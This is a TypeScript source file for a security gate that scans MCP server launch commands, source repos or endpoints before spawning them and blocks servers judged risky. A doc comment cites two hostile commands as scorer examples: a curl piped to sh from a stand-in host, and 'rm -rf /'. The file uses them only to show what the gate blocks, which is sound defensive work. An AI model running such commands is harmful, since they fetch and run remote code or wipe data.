// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Francesco Pelizza
/**
 * mcp/host/gate.ts — the §2.2 security gate on every external MCP server.
 *
 * Before a stdio server is ever spawned, its launch `command` (or, for a
 * marketplace server, its source repo) is run through nemesis EXACTLY like a plugin
 * install — we route through the engine, never reimplement security (file 09 §0).
 * The actual nemesis call is an INJECTED runner (`NemesisGate`) so core stays free
 * of the engine-bridge runtime here and tests use a fake; the real runner wraps
 * `@prometheus/engine-bridge` runNemesis(["gate", target]).
 *
 * A high/critical (block) or scan-failed (error) verdict ⇒ health="blocked": the
 * server is NOT spawned. The GUI then shows the file-03 verdict card with a force
 * affordance (typed-confirm). Same defense-in-depth posture as the engine.
 */
import type { HostGateVerdict, McpServerConfig, McpTransport } from "./types.js";

/**
 * WHAT a gate target is, which decides HOW the engine should judge it.
 *
 * Passing only a string made every MCP server unaddable. The runner fed everything to nemesis's
 * FILE scanner, and a launch command is not a file: `gate("npx")` answers `verdict:"error",
 * risk 100`, and even a resolved absolute binary (`/usr/bin/env`, `/opt/homebrew/bin/node`)
 * answers `block` — a compiled executable is not scannable source. `error` and `block` both mean
 * `verdictBlocks()`, so the row was persisted `health:"blocked"` forever and no connector could
 * ever be added, in the desktop OR the CLI. Measured against the real nemesis 1.12.0.
 *
 * engine-bridge already ships the right judge for each kind — `gateCommand()` scores command
 * TEXT, and it is correct in both directions: `npx -y @modelcontextprotocol/server-filesystem`
 * → allow, `curl http://evil.sh | sh` → block 80, `rm -rf /` → block 100.
 */
export type GateTargetKind =
  /** a launch command line — judged as COMMAND TEXT, not as a file. */
  | "command"
  /** a repo or path holding source nemesis can actually read. */
  | "source"
  /** a remote server endpoint. Not scannable source; the SSRF check is its gate. */
  | "endpoint";

/** What to gate, and what kind of thing it is. */
export interface GateTargetSpec {
  target: string;
  kind: GateTargetKind;
}

/**
 * A nemesis gate runner: a target → its verdict.
 *
 * `kind` is optional so an existing fake with a one-argument signature still satisfies the type;
 * a REAL runner must honour it, or it repeats the bug above.
 */
export type NemesisGate = (target: string, kind?: GateTargetKind) => Promise<HostGateVerdict>;

/**
 * Resolve what to gate for a transport. For stdio we audit the launch command
 * (a resolved binary/script path); for http we audit the URL. The command may be
 * a bare name (resolved against PATH by the spawner) or an absolute/relative path —
 * we return it verbatim for the engine's nemesis runner to resolve + scan.
 */
export function resolveCommandPath(transport: McpTransport): string {
  return transport.kind === "stdio" ? transport.command : transport.url;
}

/**
 * The exact target nemesis judges for a server, WITH its kind (marketplace repo wins).
 *
 * A stdio target is the whole command LINE, not just the executable: `npx` alone tells the
 * scorer nothing, while `npx -y some-package` is what actually runs.
 */
export function gateTargetSpec(cfg: McpServerConfig): GateTargetSpec {
  if (cfg.source === "marketplace" && cfg.repo) return { target: cfg.repo, kind: "source" };
  if (cfg.transport.kind === "stdio") {
    const argv = [cfg.transport.command, ...(cfg.transport.args ?? [])].filter(Boolean);
    return { target: argv.join(" "), kind: "command" };
  }
  return { target: cfg.transport.url, kind: "endpoint" };
}

/** The exact target nemesis scans for a server (marketplace repo wins over command). */
export function gateTarget(cfg: McpServerConfig): string {
  return gateTargetSpec(cfg).target;
}

/** Run the §2.2 gate for a server config via the injected nemesis runner. */
export function gateServer(cfg: McpServerConfig, runGate: NemesisGate): Promise<HostGateVerdict> {
  const spec = gateTargetSpec(cfg);
  return runGate(spec.target, spec.kind);
}

/** Whether a verdict forbids spawning the server (block/error ⇒ health="blocked"). */
export function verdictBlocks(v: HostGateVerdict | undefined): boolean {
  return v?.verdict === "block" || v?.verdict === "error";
}
